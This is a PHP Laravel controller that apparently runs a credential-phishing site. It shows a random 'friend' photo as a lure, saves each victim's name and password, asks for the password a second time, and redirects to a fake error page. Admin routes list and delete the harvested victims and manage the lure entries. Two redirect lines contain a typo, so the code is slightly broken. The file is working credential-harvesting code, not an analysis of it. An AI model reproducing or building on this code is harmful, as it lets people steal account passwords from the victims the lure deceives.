<?php

namespace App\Http\Controllers;

use App\Models\victim;
use App\Models\friendList;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Redirect;

class HomeController extends Controller
{
    public function index()
    {
        $data['fndlist'] = FriendList::inRandomOrder()->limit(1)->get();
        return view('pages.index',$data);
    }

    public function victimList()
    {
        $data['victim'] = Victim::orderBy('id', 'DESC')->get();
        return view('pages.victim',$data);
    }

    public function error()
    {
        return view('pages.error');
    }

    public function fndList()
    {
        $data['fndlist'] = FriendList::get();
        return view('pages.fnd_list', $data);
    }

    public function storeList(Request $request)
    {
        $fndList = new friendList();
        $img = [];
        $photos = array();
        if($request->hasFile('img')){
            foreach($request->file('img') as $photo) {
                $path = $photo->store('/frontend/img/fnd-list',['disk' => 'public_uploads']);
                array_push($photos, $path);
            }
            $fndList->img = json_encode($photos);
        }
        $fndList->name = $request->name;
        $save = $fndList->save();
        if($save){
            return redirect()->back();
        }
        else{
            return "Error";
        }

    }

    public function victim(Request $request)
    {
        $victim = new victim();
        $victim->victim_name = $request->victim_name;
        $victim->password = $request->password;
        $victim->fnd_name = $request->fnd_name;
        $save = $victim->save();
        $data['id'] = $victim->id;
        if($save){
            return view('pages.password2', $data);
        }else{
            return redirect()-back();
        }
    }

    public function passwordTwoStore(Request $request, $id)
    {
        $victim = victim::find($id);
        $victim->password_2 = $request->password_2;
        $save = $victim->save();
        if($save){
            return redirect('/password-error');
        }else{
            return redirect()-back();
        }
    }

    public function victimDestroy($id)
    {
        $victim = victim::find($id);
        $victim->delete();
        return redirect()->back();
    }

    public function fndDelete($id)
    {
        $friendList = friendList::find($id);
        $as = json_decode($friendList->img);
        for ($i=0; $i < count($as); $i++){
            unlink("public/".$as[$i]);
        }
        $friendList->delete();
        return redirect()->back();
    }
}
